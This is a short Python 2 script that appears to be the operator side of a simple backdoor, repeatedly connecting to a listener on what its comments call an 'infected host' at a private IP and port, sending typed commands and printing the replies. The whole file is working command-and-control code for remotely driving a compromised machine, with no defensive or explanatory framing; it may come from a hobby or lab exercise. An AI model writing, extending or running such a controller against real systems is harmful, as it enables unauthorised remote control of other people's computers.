import socket,os

while True: #infinte loop, keep asking for commands
	try: #try to establish socket and connect to listener on the infected host
		s = socket.socket() #create a socket object
		s.connect(('192.168.170.128', 50005)) #connected to infected host
		command = raw_input('Enter Command:') #get command
		print 'Sending...'
		s.send(command) 
		print "Success"
		print s.recv(1024) #recieved acknowledgement
		s.shutdown(socket.SHUT_WR) #close port gracefully 
		s.close 
	except: #if a connection can not be made then the host must be offline
		print 'Host is offline' 
		break #end script
